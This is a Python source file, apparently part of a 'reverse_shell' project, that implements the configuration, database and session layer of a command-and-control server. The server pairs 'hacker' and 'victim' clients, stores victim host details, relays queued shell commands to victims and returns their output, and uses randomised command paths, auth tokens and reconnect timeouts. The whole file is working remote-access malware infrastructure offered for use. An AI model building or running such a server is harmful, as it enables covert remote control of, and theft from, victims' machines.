""" Accept and validate configuration, and facilitate and make ready any other
data that is potentially useful for the server. """

# --- the imports
import json as js
import sqlite3 as sq
from argparse import ArgumentDefaultsHelpFormatter, ArgumentParser, Namespace
from http import HTTPStatus

# from http.client import HTTPMessage
from pathlib import Path
from typing import Optional, TypedDict

import reverse_shell.utils as ut
from reverse_shell import __app_name__, __version__
from reverse_shell.server import ErrorCodes as ec


class Output(TypedDict):
    stdout: str
    stderr: str


class Response(TypedDict):
    response: Output
    command_status_code: Optional[int]
    failed_to_execute: bool


class Communication(TypedDict):
    command: str | None
    responses: list[Response]


class SessionKeys(TypedDict):
    hacker_id: Optional[str]
    victim_id: str
    alive: bool


class SessionDoesNotExist(Exception):
    """Exception raised if session doesn't exist."""

    def __init__(self, session_id: str):
        self.message = f"The session `{session_id}` doesn't exist"
        super().__init__(self.message)


class ClientAlreadyInSession(Exception):
    """Exception raised if the client is already in a session"""

    def __init__(self, client_id: str):
        self.message = f"The client `{client_id}` is already in a session."


class Database:
    def __init__(
        self,
        db_path: Path,
        allow_multithreaded_db: bool = True,
    ):
        # ---- Required database schemas
        self.session_data_schema = [
            """
        CREATE TABLE IF NOT EXISTS victim_info(
            id TEXT PRIMARY KEY,
            host_name TEXT,
            os TEXT,
            arch TEXT,
            clock_speed INT,
            ram TEXT,
            FOREIGN KEY(id) REFERENCES clients(client_id)
        )
        """,
            """
        CREATE TABLE IF NOT EXISTS clients(
            client_id TEXT PRIMARY KEY,
            client_type TEXT,
            last_requested REAL,
            status INT
        )
        """,
        ]

        # ---- Creating instances of the parameters
        self.allow_multithreaded_db = allow_multithreaded_db

        # ---- DB initialization
        self.session_data = self.get_database(db_path, self.session_data_schema)

    def strip_schema(self, schema: str):
        """Get rid of new lines and strip a schema to make it ready for comparison also remove the `IF NOT EXISTS` that will ruin the string validation."""

        # remove the `IF NOT EXISTS` and `;` since it doesn't exist in the sqlite_schema table
        schema = schema.replace("IF NOT EXISTS ", "")
        schema = schema.replace(";", "")

        schema_lst = schema.splitlines()
        schema_lst = [schema.strip() for schema in schema_lst]

        return "".join(schema_lst)

    def query(self, query: str, __params=None, raise_for_error=False):
        """Return all results that return from a database query provided by `query` and return None when`sqlite3.OperationalError` occurs"""
        # Let's execute and handle the query
        try:
            cur = self.session_data.cursor()
            cur.execute(query, __params if __params is not None else ())
            return cur.fetchall()
        except sq.Error as e:
            if raise_for_error:
                raise sq.Error(e)
            return None

    def execute(
        self, statement: str, __params=None, raise_for_error=False
    ) -> Optional[sq.Cursor]:
        """Execute the `statement` on the database and return `None` if `sqlite3.OperationalError` get's raised and the cursor if successful."""
        try:
            conn = self.session_data.cursor()
            res_cur = conn.execute(statement, __params if __params is not None else ())
            self.session_data.commit()
            return res_cur
        except sq.Error as e:
            if raise_for_error:
                raise sq.Error(e)
            ut.log("debug", f"SQLERROR: {e}")
            ut.log("debug", f"from: `{statement}`")
            return None

    def get_database(self, db_path: Path, db_schema: list[str]) -> sq.Connection:
        """Return a sqlite3 database connection using the user_config_option parameter and validate it using the db_schema option if the database is not provided by the user needed tables will be created using the db_schema list"""

        already_existing_db = True
        if not db_path.resolve().is_file():
            # Inform the user that a new data.db is created
            ut.log("info", "Generated session database.")
            already_existing_db = False

        db = sq.connect(db_path, check_same_thread=not self.allow_multithreaded_db)
        cur = db.cursor()

        # Let's now validate the database based on the db_schema argument
        # if the is_user_given var is True.

        # First we are going to get the SQL command
        # that is created for each of the table created
        # found in the sqlite_master table
        cur.execute("SELECT sql FROM sqlite_master")
        schemas = cur.fetchall()

        # If the database is brand new and doesn't have anything on it and it's
        # user provided then we will treat it like a not user given file. if it makes sense
        if already_existing_db and schemas != []:
            # Unpack the inner tuples in the list
            schemas = [self.strip_schema(i[0]) for i in schemas if i[0] is not None]

            # We need to strip_schema the database schema given to remove
            # spaces and stuff
            stripped_db_schema = [self.strip_schema(i) for i in db_schema]

            # validate the elements
            is_valid = all(
                self.strip_schema(item) in stripped_db_schema for item in schemas
            )
            if not is_valid:
                ut.error_exit(
                    "Invalid SQL database please use one generated by the server.",
                    ec.invalid_file,
                )

        else:
            # Create the tables needed using the db_schema arg
            # we're just going to execute the commands we get from
            # the db_schema
            for schema_cmd in db_schema:
                cur.execute(schema_cmd)

            db.commit()

        return db


class Sessions:
    """Manages sessions(hackers with victims) and allows to add new sessions, delete existing ones
    and etc... using a session_id."""

    def __init__(self):
        # Let's define variables and data structures that help us
        # control the sessions

        # List of clients currently in session with a hacker.
        self._client_list = []

        self._sessions: dict[str, SessionKeys] = {
            # session_id: {
            #   hacker_id: "hacker_id",
            #   victim_id: "victim_id",
            #   active: True,
            # },
        }

        # The way the hacker and the victim talk is through this database.
        self._session_communications: dict[str, Communication] = {
            # session_id: {
            #   command: "some command",
            #   responses: ["Some responses", "here and there"],
            # }
        }

    def add_session(self, hacker_id: str, victim_id: str):
        """Create a new session based on the hacker and victim id provided."""
        # First check if either the hacker or the hacker are already in  a session.
        if self.check_client_in_session(hacker_id):
            raise ClientAlreadyInSession(hacker_id)

        if self.check_client_in_session(victim_id):
            raise ClientAlreadyInSession(victim_id)

        # Creating the session id
        session_id = ut.generate_token()

        # Initializing the data in both dictionaries
        self._sessions[session_id] = {
            "hacker_id": hacker_id,
            "victim_id": victim_id,
            "alive": True,
        }

        self._session_communications[session_id] = {
            "command": None,
            "responses": [],
        }

        # And also add the hacker and victim in the client list
        self._client_list.extend([hacker_id, victim_id])
        return session_id

    def kill_session(self, session_id: str):
        """Deactivate the given session"""
        # Make sure the session exists before activation
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Let's deactivate the session
        self._sessions[session_id]["alive"] = False

    def edit_session(
        self,
        session_id: str,
        hacker_id: Optional[str] = None,
        victim_id: Optional[str] = None,
    ):
        """Edit the session, change the hacker_id and victim_id properties.
        if you don't want to change a session_id leave it set to None."""
        # Session sanity check
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Now if the session does exist, it's just a matter of simple
        # if conditions
        if hacker_id is not None:
            self._sessions[session_id]["hacker_id"] = hacker_id
        if victim_id is not None:
            self._sessions[session_id]["victim_id"] = victim_id

    def check_session_alive(self, session_id: str):
        """Check if the given session is alive"""
        # first check if the session exists
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        return self._sessions[session_id]["alive"]

    def remove_session(self, session_id: str):
        """Remove the session based on the session id."""
        # First check if the session exists
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Now let's fetch the hacker and victim with that session_id
        hacker_victim_ids = self._sessions[session_id]

        # Removing them from the client_list list
        for client_id in list(hacker_victim_ids.values())[:-1]:
            if client_id is None:
                # This only happens if a hacker exited a session
                # and it is being removed now se we can skip it
                continue
            self._client_list.remove(client_id)

        del self._session_communications[session_id]
        del self._sessions[session_id]

    def get_session(self, session_id: str):
        """Get the session i.e the hacker and victim inside it using the session_id."""
        # First check if the session is up and running
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        return self._sessions[session_id]

    def get_session_id(self, client_id: str):
        """Get the session id using the client_id"""
        if not self.check_client_in_session(client_id):
            return None

        session_id = [
            session_id
            for session_id, session in self._sessions.items()
            if session["victim_id"] == client_id or session["hacker_id"] == client_id
        ][0]

        return session_id

    def insert_command(self, session_id: str, cmd: str):
        """Insert a new in the session provided"""
        # First let's see if the session is active
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Now let's insert the command inside the session
        self._session_communications[session_id]["command"] = cmd

    def insert_response(
        self,
        session_id: str,
        stdout: str,
        stderr: str,
        command_status_code: Optional[int],
        failed_to_execute: bool,
    ):
        """Add the response given in the responses list."""
        # As always first check if the session is active
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Now append the response in the list of responses
        self._session_communications[session_id]["responses"].append(
            {
                "response": {"stdout": stdout, "stderr": stderr},
                "command_status_code": command_status_code,
                "failed_to_execute": failed_to_execute,
            }
        )

    def get_command(self, session_id: str):
        """Fetch the command from the communications."""
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Fetch the command from the session communications
        cmd = self._session_communications[session_id]["command"]
        # Resetting the command to an empty string
        self._session_communications[session_id]["command"] = None
        return cmd

    def get_response(self, session_id: str):
        """Fetch the responses from the communications"""
        # Check if the session is active
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Fetch all responses
        res = self._session_communications[session_id]["responses"]
        self._session_communications[session_id]["responses"] = []
        return res

    def check_session_exists(self, session_id: str):
        """Check if the given session exists and is active."""
        return True if self._sessions.get(session_id, None) is not None else False

    def check_client_in_session(self, client_id: str):
        """Check if the given client is in a session. The client should be either a victim or hacker"""
        return True if client_id in self._client_list else False


class HandlerResponse:
    """A type representing the return value of the handler functions."""

    def __init__(
        self,
        successful: bool,
        res_code: HTTPStatus,
        body: Optional[bytes] = None,
        headers: dict[str, str] = {},
    ):
        self.successful = successful
        self.res_code = res_code
        self.body = body
        self.headers = headers


class DefaultCLIArgumentValues:
    port = 8080
    ip = "0.0.0.0"
    min_reconnect_timeout = 10
    max_reconnect_timeout = 1200
    request_rate = 1
    client_idle_duration = 1800


class Config:
    def __init__(self, config: Namespace, database: Optional[Database] = None):
        self.config = config

        # ---- Get the base directory
        self.base_dir = self.get_server_base_dir()

        # ---- Setup the profile file
        self.profile, self.profile_path = self.get_profile("profile.json")

        # Initialize the database according to config
        self.database = (
            Database(Path(f"{self.base_dir}/data.db")) if database is None else database
        )

        # ---- Tokens
        self.auth_token = self.get_token("auth_token")
        self.hacker_token = self.get_token("hacker_token")

        # ---- Server Commands

        # Server commands are request paths used like commands by the clients
        # to make the server do the command. privileges will be assigned
        # to each command.

        self.server_cmd_privileges = {
            ut.ServerCommands.register: [
                ut.ClientType.victim,
                ut.ClientType.hacker,
            ],
            ut.ServerCommands.fetch_cmd: [
                ut.ClientType.victim,
            ],
            ut.ServerCommands.post_res: [
                ut.ClientType.victim,
            ],
            ut.ServerCommands.post_cmd: [
                ut.ClientType.hacker,
            ],
            ut.ServerCommands.fetch_res: [
                ut.ClientType.hacker,
            ],
            ut.ServerCommands.create_session: [
                ut.ClientType.hacker,
            ],
            ut.ServerCommands.get_session: [
                ut.ClientType.victim,
            ],
            ut.ServerCommands.list_victims: [
                ut.ClientType.hacker,
            ],
            ut.ServerCommands.exit_session: [
                ut.ClientType.hacker,
            ],
            ut.ServerCommands.delete_hacker: [
                ut.ClientType.hacker,
            ],
        }

        self.server_cmds = {
            self.get_server_cmd_id(cmd): cmd for cmd in self.server_cmd_privileges
        }

        # ---- Python and response type map
        self.py_res_type_map = {
            str: "plain/text",
            dict: "application/json",
            list: "application/json",
        }

        # ---- Address
        self.port = self.get_address(
            "port", self.config.port, DefaultCLIArgumentValues.port
        )
        self.ip = self.get_address("ip", self.config.ip, DefaultCLIArgumentValues.ip)
        self.connect_ip = self.get_address(
            "connect_ip", self.config.connect_ip, self.ip
        )

        # Let's validate the IP and port addresses
        if not ut.validate_ip_address(self.ip):
            ut.error_exit(f"Invalid IP address {self.ip}", ec.invalid_ip)
        if not ut.validate_ip_address(self.connect_ip):
            ut.error_exit(f"Invalid IP address {self.connect_ip}", ec.invalid_ip)
        if not ut.validate_port(self.port):
            ut.error_exit(f"Invalid port number {self.port}", ec.invalid_port)

        # If the ip is equal to 0.0.0.0 and the connect_ip is also None
        # we need to tell the user to specify the connect_ip
        if self.ip == "0.0.0.0" and self.connect_ip == "0.0.0.0":
            ut.error_exit(
                "IP address is 0.0.0.0, but connect-ip is not specified or is set to '0.0.0.0'. If you need more info read the help message.",
                ec.connect_ip_not_specified,
            )

        # ---- Debug flag
        self.is_debug = self.config.debug

        # ---- Client idle duration
        self.client_idle_duration = self.get_client_idle_duration(
            self.config.client_idle_duration
        )

        # --- Timeouts and request rate
        # These are no use for the server itself, but for the clients that are generated
        # from it's profile
        self.get_request_rate(self.config.request_rate)
        self.get_timeout(
            "max_reconnect_timeout",
            self.config.max_reconnect_timeout,
            DefaultCLIArgumentValues.max_reconnect_timeout,
        )
        self.get_timeout(
            "min_reconnect_timeout",
            self.config.min_reconnect_timeout,
            DefaultCLIArgumentValues.min_reconnect_timeout,
        )

        # ---- Saving profile changes
        self.commit_profile()

    def get_server_base_dir(self):
        """Creates the base server directory"""
        if not self.config.server_base_dir.resolve().is_dir():
            self.config.server_base_dir.mkdir(parents=True)
        return self.config.server_base_dir

    def get_request_rate(self, user_selection):
        """Get the request rate"""
        return self._get_profile_field(
            "request_rate", user_selection, DefaultCLIArgumentValues.request_rate
        )

    def get_timeout(self, profile_field_name, user_selection, default):
        """Get the timeouts"""
        return self._get_profile_field(
            profile_field_name, user_selection, default, "timeouts"
        )

    def get_client_idle_duration(self, user_selection):
        """Get the client_idle_duration"""
        return self._get_profile_field(
            "client_idle_duration",
            user_selection,
            DefaultCLIArgumentValues.client_idle_duration,
        )

    def get_server_cmd_id(self, cmd: str):
        """Get the server command from the profiles."""
        fallback = f"/{ut.generate_token()[:8]}"
        return self._get_profile_field(cmd, None, fallback, "server_commands")

    def get_token(self, token_name: str):
        """Get the token using the token_name if the token doesn't exist then insert it."""
        fallback = ut.generate_token()
        return self._get_profile_field(token_name, None, fallback, "tokens")

    def get_address(self, profile_field_name: str, user_selection, default):
        """Get address from the profile"""
        return self._get_profile_field(
            profile_field_name, user_selection, default, "address"
        )

    def _get_profile_field(
        self,
        profile_field_name: str,
        user_selection,
        fallback,
        profile_category_name: Optional[str] = None,
    ):
        """Compares the profile field value, user_selection and fallback and returns the one with
        the highest priority and modifies the profile file accordingly."""
        # final_selection is the value we will return from the function.
        # so first we'll set it to the highest priority .i.e user_selection
        # if that's None we'll fallback to the next priority that is the value
        # form the profile file and if that doesn't exist we will use our fallback
        final_selection = user_selection

        if final_selection is None:
            # This query will return None if either the category or the profile doesn't exist
            final_selection = self.query_profile(
                profile_field_name, profile_category_name
            )
            if final_selection is None:
                # fallback to the default value
                final_selection = fallback

        # Now change the value in the profile file.
        # first check if the field has a category
        if profile_category_name is not None:
            category = self.query_profile(profile_category_name)
            if category is None:
                self.profile[profile_category_name] = {}
            # then set the final_selection to the profile
            self.profile[profile_category_name][profile_field_name] = final_selection
        else:
            self.profile[profile_field_name] = final_selection

        return final_selection

    def query_profile(self, key: str, category_name: Optional[str] = None):
        """Get a value from the profile file directly, if no category is given, or get
        the nested key under the category if it is given."""

        # if no category given then query the profile directly
        if category_name is None:
            return self.profile.get(key, None)

        category = self.profile.get(category_name, None)
        if category is None:
            return None
        # Return a key from the category
        return category.get(key, None)

    def commit_profile(self):
        """Save the changes made to `self.profile`"""
        ut.write_json(self.profile_path, self.profile)

    def get_profile(self, profile_name: str):
        """Obtain or generate the server's profile"""
        profile_path = Path(f"{self.base_dir}/{profile_name}")

        if not profile_path.resolve().is_file():
            # if the profile.json file doesn't exists in the base directory
            # Write {} to make it JSON decodable
            ut.write_blank_json(profile_path)
            # Inform the user about the creation of a new profile
            ut.log("info", "Generated a new profile.")

        # This is the validation,  we will just check if there
        # was a decode error when loading the profile
        try:
            # Load the JSON to memory
            profile = js.loads(profile_path.read_text())
            return profile, profile_path
        except js.JSONDecodeError:
            ut.error_exit(
                "Invalid profile! Please use server generated profiles.",
                ec.invalid_file,
            )

        return ({}, Path())  # Just for the type checks, specially Pylance.
        # It failed to recognize that the program quits if the js.JSONDecodeError happens


def get_argument_parser():
    """Argument parsing"""
    parser = ArgumentParser(
        prog=f"{__app_name__} server",
        description=f"The server for the {__app_name__} project",
        formatter_class=ArgumentDefaultsHelpFormatter,
    )

    parser.add_argument(
        "--server-base-dir",
        "-sd",
        type=Path,
        required=False,
        help=(
            "The directory where the program can find the server generated 'profile.json' and 'data.db'. if both or either of the files are missing new ones will be generated in the same directory."
        ),
        default=Path("./server_data/"),
    )

    parser.add_argument(
        "--debug",
        "-d",
        action="store_true",
        required=False,
        help="Run the server in debug mode.",
    )

    parser.add_argument(
        "--client-idle-duration",
        "-cid",
        type=int,
        required=False,
        help=(
            "The time(in seconds) that a client is allowed to be referred as online without"
            f" sending any request.(default={DefaultCLIArgumentValues.client_idle_duration})"
        ),
        default=None,
    )

    parser.add_argument(
        "--request-rate",
        "-rr",
        type=int,
        required=False,
        help=f"The minimum time gap between requests made by a client.(default={DefaultCLIArgumentValues.request_rate})",
        default=None,
    )

    parser.add_argument(
        "--max-reconnect-timeout",
        type=int,
        required=False,
        help=f"The maximum time the victim should not send any requests to the server due to several reasons. This will only be used if there is a problem.(default={DefaultCLIArgumentValues.max_reconnect_timeout}s)",
        default=None,
    )

    parser.add_argument(
        "--min-reconnect-timeout",
        type=int,
        required=False,
        help=f"The minimum time the victim should not send any requests to the server due to several reasons. This will only be used if there is a problem.(default={DefaultCLIArgumentValues.min_reconnect_timeout}s)",
        default=None,
    )

    parser.add_argument(
        "-p",
        "--port",
        type=int,
        required=False,
        help="The port on which the server runs on.(default=8080)",
        default=None,
    )

    parser.add_argument(
        "-i",
        "--ip",
        type=str,
        required=False,
        help=(
            "The ip where the server is hosted on. If the ip is 0.0.0.0, the 'connect_ip' must be specified. (default=0.0.0.0) i.e, all interfaces"
        ),
        default=None,
    )

    parser.add_argument(
        "-ci",
        "--connect-ip",
        type=str,
        required=False,
        help=(
            "This argument specifies the IP where the clients connect with the server. It is normally identical to the"
            " ip the server binds to, but if the server is, for example, bound to 0.0.0.0 you need to specify this argument."
        ),
        default=None,
    )

    parser.add_argument(
        "--version",
        "-v",
        action="version",
        version=f"{__app_name__} server v{__version__}",
    )

    return parser


if __name__ == "__main__":
    config = get_argument_parser()
    Config(config.parse_args())
